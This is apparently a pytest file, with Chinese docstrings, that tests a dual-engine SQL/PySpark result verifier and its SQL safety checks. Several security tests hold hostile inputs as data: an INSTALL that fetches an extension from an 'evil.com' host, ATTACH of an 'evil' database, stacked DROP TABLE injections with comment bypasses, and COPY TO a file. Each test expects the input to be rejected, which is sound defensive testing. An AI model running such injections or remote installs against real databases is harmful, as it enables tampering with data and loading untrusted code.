"""Phase 7B PhysicalVerifier 测试——双引擎执行 + 结果对比。

覆盖：
- ResultCanonicalizer 规范化策略（排序/NULL/NaN/Decimal/去重）
- DuckDB 真实执行（SQL 查询本地 Parquet 快照）
- Spark 执行 mock（PySpark 环境不可用时，mock 覆盖 34 个用例）
- PhysicalVerificationStatus 精确状态（禁止泛化 PASS）
- 不支持类型标记 UNSUPPORTED_SEMANTICS
- 双引擎结果对比（一致/不一致/错误）

重要说明：
- TestDuckDBMockedSpark 的 34 个用例在 DuckDB 真实执行 + Spark mock 下全部通过
- TestRealSparkExecution 的 11 个真实 Spark 物理一致性用例需 `--run-slow` 且
  本机安装 PySpark（含兼容 Java 版本）才执行；不具备时自动 skipped
- 因此当前本机验收结论应为"SQL 安全 + DuckDB 真实 + PySpark mock 闭环已证明"，
  而非"本机真实 Spark 双引擎闭环已完整证明"
"""

from __future__ import annotations

import os

import pytest

from tianshu_datadev.spark.cre_encoding import (
    CreShadowReport,
    EnvironmentManifest,
    SpecialFloatStrategy,
)
from tianshu_datadev.spark.executor import (
    LocalSparkExecutor,
    SparkExecutionResult,
    SparkExecutionStatus,
)
from tianshu_datadev.spark.physical_verifier import (
    CanonicalizationError,
    DiffDetail,
    EngineExecutionResult,
    NormalizationColumn,
    NormalizationConfig,
    PhysicalVerificationReport,
    PhysicalVerificationStatus,
    PhysicalVerifier,
    ResultCanonicalizer,
    _has_multiple_statements,
    _register_parquet_views,
    _strip_sql_comments,
    _validate_select_sql,
)
from tianshu_datadev.sql.models import CompiledSql, OptimizedSQLPlan, ProgramCompiledSql


def _compiled_sql(sql: str) -> CompiledSql:
    """构造物理验证测试使用的最小确定性编译产物。"""
    optimized_plan = OptimizedSQLPlan(
        input_plan_hash="plan_hash",
        output_plan_hash="plan_hash",
    )
    return CompiledSql(
        sql=sql,
        sql_sha256=CompiledSql.compute_sql_hash(sql, "test"),
        optimized_plan=optimized_plan,
        compiler_version="test",
        input_plan_hash="plan_hash",
    )

# ════════════════════════════════════════════
# ResultCanonicalizer 测试
# ════════════════════════════════════════════


class TestResultCanonicalizer:
    """ResultCanonicalizer 规范化策略测试。"""

    def test_column_name_normalization(self):
        """列名归一化——去表前缀、统一小写。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"od.order_id": "1", "od.AMOUNT": 100},
            {"od.order_id": "2", "od.amount": 200},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["od.order_id"],
        )

        # 列名归一化为 order_id, amount
        for row in result:
            assert "order_id" in row
            assert "amount" in row
            assert "od.order_id" not in row

    def test_null_value_normalization(self):
        """NULL 值 → 空字符串。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "name": None},
            {"id": "2", "name": "Alice"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"],
        )

        assert result[0]["name"] == ""
        assert result[1]["name"] == "Alice"  # 值归一化保留原大小写

    def test_nan_value_normalization(self):
        """NaN → 空字符串。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "score": float("nan")},
            {"id": "2", "score": 95.5},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"],
        )

        assert result[0]["score"] == ""
        assert result[1]["score"] == "95.5"

    def test_ordering_by_keys(self):
        """按指定键排序——确保对比确定性。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "3", "val": "c"},
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"],
        )

        assert result[0]["id"] == "1"
        assert result[1]["id"] == "2"
        assert result[2]["id"] == "3"

    def test_deduplication(self):
        """去重——重复行只保留一条。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "val": "a"},
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=["id"], deduplicate=True,
        )

        assert len(result) == 2

    def test_empty_rows(self):
        """空行列表——返回空列表。"""
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer.canonicalize([], order_keys=["id"])
        assert result == []

    def test_missing_order_keys_raises(self):
        """无排序键且不去重 → CanonicalizationError。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        with pytest.raises(CanonicalizationError):
            canonicalizer.canonicalize(rows, order_keys=None, deduplicate=False)

    def test_no_order_keys_with_dedup_passes(self):
        """无排序键但去重——可以对比（行集合等价）。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "val": "a"},
            {"id": "2", "val": "b"},
        ]
        result = canonicalizer.canonicalize(
            rows, order_keys=None, deduplicate=True,
        )
        assert len(result) == 2

    def test_single_row_no_order_keys_passes(self):
        """单行结果无排序键——天然确定，无需排序键。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"id": "1", "val": "a"},
        ]
        # 单行无排序键不去重——不应抛异常
        result = canonicalizer.canonicalize(rows, order_keys=None, deduplicate=False)
        assert len(result) == 1
        assert result[0]["id"] == "1"

    # ── datetime 归一化测试（双引擎 JSON 往返类型丢失修复）──

    def test_datetime_date_normalization(self):
        """datetime.date → ISO 格式字符串 YYYY-MM-DD。"""
        import datetime as _dt
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer._normalize_value(_dt.date(2026, 1, 15))
        assert result == "2026-01-15"

    def test_datetime_datetime_normalization(self):
        """datetime.datetime → 空格分隔格式（与 DuckDB str() 对齐）。"""
        import datetime as _dt
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer._normalize_value(
            _dt.datetime(2026, 1, 15, 10, 30, 0),
        )
        assert result == "2026-01-15 10:30:00"

    def test_iso_t_string_normalization(self):
        """ISO 8601 T 分隔字符串 → 空格分隔——PySpark toJSON() 产物归一化。"""
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer._normalize_value("2026-01-15T10:30:00")
        assert result == "2026-01-15 10:30:00"

    def test_iso_t_microsecond_string_normalization(self):
        """ISO 8601 含微秒的 T 分隔字符串 → 秒级空格分隔（小数秒丢弃）。

        DuckDB 侧 datetime 经 strftime("%H:%M:%S") 丢弃微秒，Spark 侧
        ISO 字符串必须同样丢弃小数秒，否则键对齐时每行必不相等。
        """
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer._normalize_value("2026-01-15T10:30:00.123456")
        assert result == "2026-01-15 10:30:00"

    def test_iso_t_millis_timezone_normalization(self):
        """Spark toJSON 默认时间戳格式（毫秒+时区偏移）→ 秒级空格分隔。

        溢出降级抽样零匹配的根因之一：'2026-01-06T06:04:06.000+08:00'
        旧正则不匹配时区后缀导致原样保留，与 DuckDB '2026-01-06 06:04:06'
        键对齐必然失败。
        """
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(
            "2026-01-06T06:04:06.000+08:00",
        ) == "2026-01-06 06:04:06"

    def test_iso_t_millis_utc_z_normalization(self):
        """UTC Z 后缀的 ISO 时间戳 → 秒级空格分隔。"""
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(
            "2026-01-06T06:04:06.000Z",
        ) == "2026-01-06 06:04:06"

    def test_iso_t_compact_timezone_normalization(self):
        """紧凑时区偏移（+0800 无冒号）的 ISO 时间戳 → 秒级空格分隔。"""
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(
            "2026-01-06T06:04:06.000+0800",
        ) == "2026-01-06 06:04:06"

    # ── Decimal/浮点表示归一化（溢出降级键对齐根因之二）──

    def test_decimal_trailing_zeros_normalized(self):
        """Decimal 去尾零——DuckDB Decimal('11.80') 与 Spark JSON float 11.8 对齐。"""
        from decimal import Decimal
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(Decimal("11.80")) == "11.8"

    def test_decimal_integral_no_scientific_notation(self):
        """整值 Decimal 归一化不得产生科学计数法（100.00 → '100' 而非 '1E+2'）。"""
        from decimal import Decimal
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(Decimal("100.00")) == "100"

    def test_decimal_vs_spark_float_equivalence(self):
        """DuckDB Decimal 与 Spark JSON 解析 float 归一化后必须相等。"""
        from decimal import Decimal
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(
            Decimal("11.80"),
        ) == canonicalizer._normalize_value(11.8)
        assert canonicalizer._normalize_value(
            Decimal("100.00"),
        ) == canonicalizer._normalize_value(100.0)

    def test_integral_float_drops_point_zero(self):
        """整值 float 去 '.0'——与整值 Decimal 表示对齐。"""
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(100.0) == "100"

    def test_decimal_large_precision_preserved(self):
        """大数值 Decimal 归一化保留全部有效位（禁止经 float 转换损失精度）。"""
        from decimal import Decimal
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value(
            Decimal("123456789012345678.90"),
        ) == "123456789012345678.9"

    def test_duckdb_datetime_vs_spark_json_string_equivalence(self):
        """DuckDB 原生 datetime 与 PySpark JSON 字符串归一化后等价。

        这是 PHYSICAL_VERIFIER RESULT_MISMATCH 的根因修复验证——
        DuckDB fetchall() 返回 datetime.datetime，PySpark toJSON() 产生
        ISO T 分隔字符串，_normalize_value 必须将两者归一化为相同格式。
        """
        import datetime as _dt
        canonicalizer = ResultCanonicalizer()
        duckdb_val = canonicalizer._normalize_value(
            _dt.datetime(2026, 1, 15, 10, 30, 0),
        )
        spark_val = canonicalizer._normalize_value("2026-01-15T10:30:00")
        assert duckdb_val == spark_val, (
            f"DuckDB datetime 与 PySpark JSON 归一化后应一致，"
            f"实际 duckdb={duckdb_val!r}, spark={spark_val!r}"
        )

    def test_plain_string_not_affected(self):
        """非 datetime 格式的普通字符串不受影响。"""
        canonicalizer = ResultCanonicalizer()
        assert canonicalizer._normalize_value("Manhattan") == "Manhattan"
        assert canonicalizer._normalize_value("2026-01-15") == "2026-01-15"
        assert canonicalizer._normalize_value(42) == "42"

    def test_date_iso_string_not_mistaken_for_datetime(self):
        """YYYY-MM-DD 格式的日期字符串不应被误当 datetime 处理（不含 T）。"""
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer._normalize_value("2026-01-15")
        # 不含 T 的日期字符串应原样保留
        assert result == "2026-01-15"

    # ── NaN 处理测试（浮点精度归一化已在设计阶段，待实现）──

    def test_float_nan_still_returns_empty(self):
        """NaN 仍然返回空字符串（浮点精度修复不应影响 NaN 处理）。"""
        canonicalizer = ResultCanonicalizer()
        result = canonicalizer._normalize_value(float("nan"))
        assert result == ""

    def test_missing_column_filled_in_canonicalize(self):
        """PySpark toJSON() 省略 null 字段——canonicalize 补齐缺失列。

        真实场景：714 行中 712 行有 total_revenue 键，最后 2 行（NULL 值）缺失该键。
        补齐依赖同结果集中其他行提供键名。
        """
        canonicalizer = ResultCanonicalizer()
        # 模拟真实场景：前 712 行有 total_revenue，最后 2 行缺失
        spark_rows = [
            {"pickup_date_key": "2026-03-31", "borough": "Bronx",
             "total_fare": "21.97", "total_revenue": "0"},
            {"pickup_date_key": "2026-03-31", "borough": "Brooklyn",
             "total_fare": "63.78"},  # 缺少 total_revenue
        ]
        spark_norm = canonicalizer.canonicalize(spark_rows, order_keys=["pickup_date_key", "borough"])

        assert len(spark_norm) == 2
        # 第二行应补齐 total_revenue 键
        assert "total_revenue" in spark_norm[1], (
            f"canonicalize 应补齐缺失的 total_revenue 列，"
            f"实际键={sorted(spark_norm[1].keys())}"
        )
        # 补齐值应为空字符串（与 _normalize_value(None) 一致）
        assert spark_norm[1]["total_revenue"] == "", (
            f"缺失列补齐值应为空字符串，实际={spark_norm[1]['total_revenue']!r}"
        )

    def test_missing_column_filled_across_multiple_rows(self):
        """补齐缺失列——多行场景，某些行有键、某些行无键。"""
        canonicalizer = ResultCanonicalizer()
        rows = [
            {"a": "1", "b": "x"},
            {"a": "2"},           # 缺少 b
            {"a": "3", "b": "z"},
        ]
        result = canonicalizer.canonicalize(rows, order_keys=["a"])
        assert len(result) == 3
        for i, row in enumerate(result):
            assert "b" in row, f"第 {i} 行应补齐 b 列，实际键={sorted(row.keys())}"
        assert result[1]["b"] == ""  # 缺失的 b 应为空字符串
        assert result[0]["b"] == "x"
        assert result[2]["b"] == "z"


class TestDuckDBExecution:
    """DuckDB 真实执行——从 Parquet 快照读取并执行 SQL。"""

    def test_duckdb_simple_query(self, temp_parquet_dir):
        """简单 DuckDB 查询——SELECT * FROM 快照视图。"""
        verifier = PhysicalVerifier()
        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)

        assert result.status == SparkExecutionStatus.SUCCESS
        assert len(result.output_rows) == 3
        # 第一行
        row = result.output_rows[0]
        assert row["order_id"] == "1"
        assert row["amount"] == 100

    def test_duckdb_aggregate_query(self, temp_parquet_dir):
        """DuckDB 聚合查询——GROUP BY + COUNT。"""
        verifier = PhysicalVerifier()
        sql = (
            'SELECT "region", COUNT(*) AS cnt '
            'FROM "order_info" GROUP BY "region" '
            'ORDER BY "region"'
        )
        result = verifier._execute_duckdb(sql, temp_parquet_dir)

        assert result.status == SparkExecutionStatus.SUCCESS
        assert len(result.output_rows) == 2  # east, west
        rows_by_region = {r["region"]: r["cnt"] for r in result.output_rows}
        assert rows_by_region["east"] == 2
        assert rows_by_region["west"] == 1

    def test_duckdb_executes_compiled_program_prerequisites(self, temp_parquet_dir):
        """多语句编译产物必须在同一连接中创建并读取临时表。"""
        setup_sql = (
            "-- deterministic compiler output\n"
            "CREATE TEMP TABLE _temp_orders AS\n"
            'SELECT * FROM "order_info" WHERE "amount" >= 100'
        )
        final_sql = 'SELECT * FROM _temp_orders ORDER BY "order_id"'
        program = ProgramCompiledSql(
            program_id="program_test",
            statements=[_compiled_sql(setup_sql), _compiled_sql(final_sql)],
            cleanup_sql=["DROP TABLE IF EXISTS _temp_orders"],
            statement_order=["setup", "final"],
        )

        result = PhysicalVerifier()._execute_duckdb(
            final_sql,
            temp_parquet_dir,
            compiled_program=program,
        )

        assert result.status == SparkExecutionStatus.SUCCESS
        assert [row["order_id"] for row in result.output_rows] == ["1", "2", "3"]

    def test_duckdb_rejects_unsafe_compiled_program(self, temp_parquet_dir):
        """结构化程序也不能借前置语句执行任意 DDL/DML。"""
        final_sql = 'SELECT * FROM "order_info"'
        program = ProgramCompiledSql(
            program_id="program_unsafe",
            statements=[
                _compiled_sql('CREATE TABLE unsafe AS SELECT * FROM "order_info"'),
                _compiled_sql(final_sql),
            ],
            statement_order=["unsafe", "final"],
        )

        result = PhysicalVerifier()._execute_duckdb(
            final_sql,
            temp_parquet_dir,
            compiled_program=program,
        )

        assert result.status == SparkExecutionStatus.SECURITY_REJECTED

    def test_duckdb_rejects_dangerous_sql(self, temp_parquet_dir):
        """危险 SQL（DROP）→ SECURITY_REJECTED。"""
        verifier = PhysicalVerifier()
        sql = 'DROP TABLE "order_info"'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)

        assert result.status == SparkExecutionStatus.SECURITY_REJECTED


# ════════════════════════════════════════════
# DuckDB SQL 安全校验测试
# ════════════════════════════════════════════


class TestDuckDBSecurity:
    """DuckDB SQL 安全校验——白名单 + 黑名单纵深防御。

    验证 _validate_select_sql 对各类危险 SQL 的拒绝能力，
    以及 _register_parquet_views 的参数化查询和路径安全。
    """

    # ── SQL 安全校验单元测试 ──

    def test_validate_select_simple(self):
        """简单 SELECT 通过校验。"""
        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_select_aggregate(self):
        """SELECT + GROUP BY + ORDER BY 通过校验。"""
        sql = 'SELECT "region", COUNT(*) AS cnt FROM "order_info" GROUP BY "region" ORDER BY "region"'
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_select_with_join(self):
        """SELECT ... JOIN 通过校验。"""
        sql = (
            'SELECT a."order_id", a."amount" '
            'FROM "order_info" a JOIN "order_info" b ON a."order_id" = b."order_id" '
            'ORDER BY a."order_id"'
        )
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_select_with_subquery(self):
        """SELECT 含子查询通过校验。"""
        sql = (
            'SELECT "order_id", "amount" FROM "order_info" '
            'WHERE "amount" > (SELECT AVG("amount") FROM "order_info") '
            'ORDER BY "order_id"'
        )
        result = _validate_select_sql(sql)
        assert result == sql

    def test_validate_with_select(self):
        """WITH ... SELECT 必须被拒绝——CTE 不在项目架构允许范围内。"""
        sql = (
            'WITH regional AS (SELECT "region", AVG("amount") AS avg_amt '
            'FROM "order_info" GROUP BY "region") '
            'SELECT * FROM regional ORDER BY "region"'
        )
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_cte_with_select(self):
        """CTE（WITH ... AS (...) SELECT）必须被拒绝——项目用 _temp_ 表而非 CTE。

        验证 WITH 前缀被结构白名单拒绝，错误消息含 "SELECT 开头"。
        """
        sql = "WITH cte AS (SELECT 1 AS n) SELECT * FROM cte"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_multi_cte(self):
        """多个 CTE（WITH a AS (...), b AS (...) SELECT）必须被拒绝。"""
        sql = (
            'WITH a AS (SELECT 1 AS n), b AS (SELECT n+1 AS m FROM a) '
            'SELECT * FROM b'
        )
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_cte_with_insert(self):
        """WITH ... INSERT 必须被拒绝——结构白名单 + 关键词黑名单双重拦截。"""
        sql = "WITH cte AS (SELECT 1) INSERT INTO t SELECT * FROM cte"
        with pytest.raises(ValueError):
            _validate_select_sql(sql)

    def test_rejects_multi_statement(self):
        """拒绝多语句——分号分隔。"""
        sql = 'SELECT * FROM "order_info"; DROP TABLE "order_info"'
        with pytest.raises(ValueError, match="多语句"):
            _validate_select_sql(sql)

    def test_rejects_line_comment_bypass(self):
        """拒绝行注释绕过——-- 后的 DROP。"""
        sql = 'SELECT * FROM "order_info";--\nDROP TABLE "order_info"'
        with pytest.raises(ValueError, match="多语句"):
            _validate_select_sql(sql)

    def test_rejects_block_comment_bypass(self):
        """拒绝块注释绕过——/* */ 后的 DROP。"""
        sql = 'SELECT * FROM "order_info";/*comment*/DROP TABLE "order_info"'
        with pytest.raises(ValueError, match="多语句"):
            _validate_select_sql(sql)

    def test_rejects_attach_database(self):
        """拒绝 ATTACH DATABASE。"""
        sql = "ATTACH DATABASE '/tmp/evil.db' AS evil"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_install_extension(self):
        """拒绝 INSTALL——禁止安装扩展。"""
        sql = "INSTALL 'http://evil.com/malware.duckdb_extension'"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_insert(self):
        """拒绝 INSERT。"""
        sql = 'INSERT INTO "order_info" VALUES (4, 500, \'north\')'
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_copy_to_file(self):
        """拒绝 COPY TO——禁止文件导出。"""
        sql = "COPY (SELECT * FROM \"order_info\") TO '/tmp/export.csv'"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_pragma(self):
        """拒绝 PRAGMA——禁止数据库级操作。"""
        sql = "PRAGMA database_list"
        with pytest.raises(ValueError, match="SELECT 开头"):
            _validate_select_sql(sql)

    def test_rejects_drop_table(self):
        """拒绝 DROP TABLE（黑名单关键词）。"""
        sql = "DROP TABLE x"
        with pytest.raises(ValueError):
            _validate_select_sql(sql)

    def test_rejects_delete(self):
        """拒绝 DELETE（黑名单关键词）。"""
        sql = "DELETE FROM x WHERE 1=1"
        with pytest.raises(ValueError):
            _validate_select_sql(sql)

    def test_select_with_keyword_in_string_allowed(self):
        """SELECT 中字符串含 DROP 关键词——允许（剥离字面量后校验）。"""
        sql = "SELECT 'DROP TABLE warning--ignore' AS msg FROM \"order_info\" ORDER BY \"order_id\""
        result = _validate_select_sql(sql)
        assert result == sql

    def test_select_with_escaped_quote_in_string(self):
        """字符串中 SQL 转义引号 '' 后含关键词——允许。"""
        sql = "SELECT 'it''s a DROP test' AS msg FROM \"order_info\""
        result = _validate_select_sql(sql)
        assert result == sql

    def test_comment_inside_string_not_stripped(self):
        """字符串内的 -- 不当作注释去除——保留原样，多语句检测不触发。"""
        sql = "SELECT '-- this is not a comment' AS note FROM \"order_info\""
        # 不去除引号内容中的 --，结果无分号多语句，应通过
        result = _validate_select_sql(sql)
        assert result == sql

    def test_rejects_multistatement_hidden_in_string(self):
        """字符串内 -- 导致注释误剥离→多语句检测绕过——回归测试。

        复现：SELECT '--'; SELECT 2 中 '--' 被正则当作行注释删掉，
        连带吃掉分号，导致多语句检测失效。修复后必须先剥离字符串再剥离注释。
        """
        sql = "SELECT '--'; SELECT 2"
        with pytest.raises(ValueError, match="多语句"):
            _validate_select_sql(sql)

    # ── 注释去除单元测试 ──

    def test_strip_line_comment(self):
        """去除行注释。"""
        result = _strip_sql_comments("SELECT 1 -- this is a comment\nFROM x")
        assert "comment" not in result
        assert "SELECT 1" in result
        assert "FROM x" in result

    def test_strip_block_comment(self):
        """去除块注释。"""
        result = _strip_sql_comments("SELECT /* inline */ 1 FROM /* multi\nline */ x")
        assert "inline" not in result
        assert "multi" not in result
        assert "/*" not in result
        assert "*/" not in result
        assert "1 FROM" in result

    # ── 多语句检测单元测试 ──

    def test_has_multiple_statements_true(self):
        """检测到引号外的分号。"""
        assert _has_multiple_statements("SELECT 1; SELECT 2") is True

    def test_has_multiple_statements_false(self):
        """单语句无引号外分号。"""
        assert _has_multiple_statements("SELECT 'a;b' AS x") is False

    def test_has_multiple_statements_semicolon_in_string(self):
        """分号在引号内——不算多语句。"""
        assert _has_multiple_statements("SELECT 'hello;world' AS x") is False

    # ── 集成测试：_execute_duckdb 安全拒绝 ──

    def test_execute_rejects_multi_statement(self, temp_parquet_dir):
        """_execute_duckdb 拒绝多语句——SECURITY_REJECTED。"""
        verifier = PhysicalVerifier()
        sql = 'SELECT * FROM "order_info"; DROP TABLE "order_info"'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)
        assert result.status == SparkExecutionStatus.SECURITY_REJECTED
        assert "多语句" in result.error_message

    def test_execute_rejects_insert(self, temp_parquet_dir):
        """_execute_duckdb 拒绝 INSERT——SECURITY_REJECTED。"""
        verifier = PhysicalVerifier()
        sql = 'INSERT INTO "order_info" VALUES (4, 500, \'north\')'
        result = verifier._execute_duckdb(sql, temp_parquet_dir)
        assert result.status == SparkExecutionStatus.SECURITY_REJECTED

    # ── 视图注册安全测试 ──

    def test_register_view_invalid_name_skipped(self, temp_parquet_dir):
        """非法视图名（含特殊字符）→ 跳过注册。"""
        import duckdb

        # 在 temp 目录下创建非法名称的 Parquet 文件
        bad_filename = "bad-table;name.parquet"
        bad_path = os.path.join(temp_parquet_dir, bad_filename)

        import pyarrow as pa
        import pyarrow.parquet as pq
        table = pa.table({"id": ["1"], "val": [10]})
        pq.write_table(table, bad_path)

        con = duckdb.connect()
        _register_parquet_views(con, temp_parquet_dir)

        # 非法名称不应注册为视图——查询应失败
        try:
            con.execute('SELECT * FROM "bad-table;name"')
            # 如果没抛异常，说明注册了（不应发生）
            pytest.fail("非法视图名不应被注册")
        except Exception:
            pass  # 预期：视图不存在
        finally:
            con.close()
            os.remove(bad_path)

    def test_register_view_valid_name_works(self, temp_parquet_dir):
        """合法视图名正常注册——可查询。"""
        import duckdb

        con = duckdb.connect()
        _register_parquet_views(con, temp_parquet_dir)

        # order_info.parquet 应注册为 "order_info" 视图
        result = con.execute('SELECT COUNT(*) FROM "order_info"').fetchone()
        assert result[0] == 3
        con.close()

    def test_register_view_schema_table_format(self, temp_parquet_dir):
        """schema.table 格式 Parquet → 自动创建 schema 并注册视图。"""
        import duckdb
        import pyarrow as pa
        import pyarrow.parquet as pq

        # 创建 schema.table 格式的 Parquet 文件——模拟 gold.fact_trips 场景
        schema_table_file = "gold.fact_trips.parquet"
        file_path = os.path.join(temp_parquet_dir, schema_table_file)
        table = pa.table({"trip_id": ["t1", "t2"], "amount": [50, 75]})
        pq.write_table(table, file_path)

        con = duckdb.connect()
        _register_parquet_views(con, temp_parquet_dir)

        # 应能通过两段式名称查询——schema "gold" 已自动创建
        result = con.execute(
            'SELECT COUNT(*) FROM "gold"."fact_trips"'
        ).fetchone()
        assert result[0] == 2

        # 验证 schema 确实存在
        schemas = con.execute(
            "SELECT schema_name FROM information_schema.schemata "
            "WHERE schema_name = 'gold'"
        ).fetchall()
        assert len(schemas) == 1

        con.close()
        os.remove(file_path)

    def test_register_view_multi_dot_skipped(self, temp_parquet_dir):
        """多段名称（a.b.c）→ 静默跳过——仅支持 schema.table 两级。"""
        import duckdb
        import pyarrow as pa
        import pyarrow.parquet as pq

        # 创建三段式名称——非法，应被跳过
        multi_dot_file = "a.b.c.parquet"
        file_path = os.path.join(temp_parquet_dir, multi_dot_file)
        table = pa.table({"id": ["1"], "val": [10]})
        pq.write_table(table, file_path)

        con = duckdb.connect()
        _register_parquet_views(con, temp_parquet_dir)

        # 三段式名称不应被注册
        try:
            con.execute('SELECT * FROM "a"."b"."c"')
            pytest.fail("三段式名称不应被注册")
        except Exception:
            pass  # 预期：视图不存在

        con.close()
        os.remove(file_path)


# ════════════════════════════════════════════
# PhysicalVerifier mock 测试
# ════════════════════════════════════════════


class _MockSparkExecutor:
    """Mock Spark 执行器——返回预设结果，不启动真实 PySpark。"""

    def __init__(self, rows: list[dict] | None = None, success: bool = True) -> None:
        self._rows = rows or []
        self._success = success
        self._call_count = 0

    def execute(self, pyspark_code: str, data_dir: str | None = None,
                output_var: str = "result_df",
                sample_keys: list[str] | None = None,
                force_overflow: bool = False) -> SparkExecutionResult:
        self._call_count += 1
        if self._success:
            return SparkExecutionResult(
                status=SparkExecutionStatus.SUCCESS,
                output_rows=list(self._rows),
                execution_time_ms=10.0,
            )
        else:
            return SparkExecutionResult(
                status=SparkExecutionStatus.RUNTIME_ERROR,
                error_message="Mock Spark error",
            )


class _MockOverflowSparkExecutor:
    """Mock 溢出执行器——模拟结果超收集上限的降级收集（count + 维度值抽样）。"""

    def __init__(
        self,
        total_row_count: int | None,
        sample_rows: list[dict] | None = None,
        sample_dim: str | None = None,
        sample_values: list[str] | None = None,
    ) -> None:
        self._total = total_row_count
        self._sample = sample_rows or []
        self._sample_dim = sample_dim
        self._sample_values = sample_values or []
        self.received_sample_keys: list[str] | None = None
        self.received_force_overflow: bool | None = None

    def execute(self, pyspark_code: str, data_dir: str | None = None,
                output_var: str = "result_df",
                sample_keys: list[str] | None = None,
                force_overflow: bool = False) -> SparkExecutionResult:
        self.received_sample_keys = sample_keys
        self.received_force_overflow = force_overflow
        return SparkExecutionResult(
            status=SparkExecutionStatus.SUCCESS,
            output_rows=list(self._sample),
            result_overflow=True,
            total_row_count=self._total,
            sample_dim=self._sample_dim,
            sample_values=list(self._sample_values),
            execution_time_ms=10.0,
            error_message="结果行数超过上限（100000）——mock 降级收集",
        )


class TestOverflowDegradedVerification:
    """溢出降级验证——行数对比 + 维度值抽样组对比，替代直接 NOT_EXECUTED。"""

    def test_count_and_sample_match_returns_sampled_consistent(self, temp_parquet_dir):
        """行数一致 + 抽样组逐列一致 → SAMPLED_CONSISTENT（抽样一致，非全量一致）。"""
        # DuckDB 侧 3 行；mock Spark 引擎内计数 3，维度值抽样覆盖 order_id ∈ {1, 3}
        mock_spark = _MockOverflowSparkExecutor(
            total_row_count=3,
            sample_rows=[
                {"order_id": "1", "amount": 100, "region": "east"},
                {"order_id": "3", "amount": 150, "region": "east"},
            ],
            sample_dim="order_id",
            sample_values=["1", "3"],
        )
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_001",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.SAMPLED_CONSISTENT
        assert report.row_count_match
        assert report.total_diff_count == 0
        # 引擎内总行数进入报告——Spark 侧 raw_row_count 为 count() 结果
        assert report.spark_result is not None
        assert report.spark_result.raw_row_count == 3

    def test_count_mismatch_returns_result_mismatch(self, temp_parquet_dir):
        """引擎内行数不一致 → RESULT_MISMATCH（确定性差异，无需抽样）。"""
        mock_spark = _MockOverflowSparkExecutor(total_row_count=5, sample_rows=[])
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_002",
            order_keys=["order_id"],
        )

        assert report.status == PhysicalVerificationStatus.RESULT_MISMATCH
        assert not report.row_count_match
        assert "行数" in report.error_message

    def test_sample_value_mismatch_returns_result_mismatch(self, temp_parquet_dir):
        """行数一致但抽样组内值不一致 → RESULT_MISMATCH 且携带差异明细。"""
        mock_spark = _MockOverflowSparkExecutor(
            total_row_count=3,
            sample_rows=[
                {"order_id": "1", "amount": 999, "region": "east"},  # amount 不同
            ],
            sample_dim="order_id",
            sample_values=["1"],
        )
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_hash_overflow",
            snapshot_id="snap_overflow_003",
            order_keys=["order_id"],
        )

